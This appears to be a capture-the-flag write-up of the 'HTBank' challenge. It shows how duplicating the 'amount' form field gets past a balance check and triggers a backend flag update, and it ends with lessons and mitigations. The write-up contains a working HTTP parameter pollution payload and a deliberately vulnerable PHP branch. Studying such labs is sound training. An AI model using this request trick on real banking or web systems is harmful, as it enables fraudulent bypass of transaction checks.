# HTBank Challenge: Parameter Pollution Exploit

## Overview

In this challenge, we exploited **parameter pollution** to trigger a specific SQL update in the backend, bypassing restrictions imposed by account balance checks.

---

## Vulnerable Page

The page accepts two parameters, `amount` and `account`, used for transferring money to a specified account. An example POST request looks like:

```http
-----------------------------347926212315686409974148623746
Content-Disposition: form-data; name="account"

123123123
-----------------------------347926212315686409974148623746
Content-Disposition: form-data; name="amount"

123
-----------------------------347926212315686409974148623746--
```

---

## Vulnerability in Backend Code

The backend contains the following logic in the `WithdrawController.php` file:

```php
if ($amount == 1337) {
    $this->database->query('UPDATE flag set show_flag=1');

    return $router->jsonify([
        'message' => 'OK'
    ]);
}
```

### Key Observations:

1. **SQL Update Trigger**: The SQL query updates the `show_flag` column to `1` when the `amount` parameter equals `1337`.
2. **Account Balance Restriction**: The transfer is blocked if the account balance is insufficient. On our test account, the balance was `$0`.

---

## Exploitation Strategy

To bypass the balance restriction and trigger the SQL query, we used **HTTP Parameter Pollution (HPP)**. By sending multiple `amount` parameters in the request, we controlled how the server interpreted the values.

### Exploit POST Request

```http
-----------------------------41568353612097066037194589025
Content-Disposition: form-data; name="account"

123123123
-----------------------------41568353612097066037194589025
Content-Disposition: form-data; name="amount"

0
-----------------------------41568353612097066037194589025
Content-Disposition: form-data; name="amount"

1337
-----------------------------41568353612097066037194589025--
```

### Explanation of the Payload:

1. **First `amount` Parameter**:
   
   - Value: `0`
   - Purpose: Ensures the transaction is allowed by satisfying the account balance restriction.

2. **Second `amount` Parameter**:
   
   - Value: `1337`
   - Purpose: Triggers the SQL query to update the `show_flag` column.

---

## Result

When the request was sent, the server processed the parameters in a way that bypassed the balance check (`amount=0`) and executed the SQL update (`amount=1337`). Upon refreshing the page, the flag was revealed:

### Flag Output

```
HTB{example_flag_value_here}
```

---

## Lessons Learned

### Key Takeaways

1. **HTTP Parameter Pollution**
   
   - Servers may process multiple instances of the same parameter differently, leading to unexpected behaviors.

2. **Validation Logic Vulnerabilities**
   
   - Insufficient checks on parameter handling can allow bypasses.

3. **SQL Update Logic**
   
   - Direct execution of queries based on user input can lead to unintended consequences.

### Mitigation Strategies

1. **Sanitize Input**:
   
   - Ensure that duplicate parameters are not processed or clearly define how they should be handled.

2. **Account Balance Validation**:
   
   - Perform strict checks to ensure the account balance is sufficient for the entire transaction.

3. **SQL Query Security**:
   
   - Avoid directly embedding user inputs in SQL queries without thorough validation.

---

## Skills Gained

1. Understanding and exploiting **HTTP Parameter Pollution**.
2. Analyzing backend logic to identify security flaws.
3. Crafting specific payloads to bypass restrictions and manipulate server-side logic.
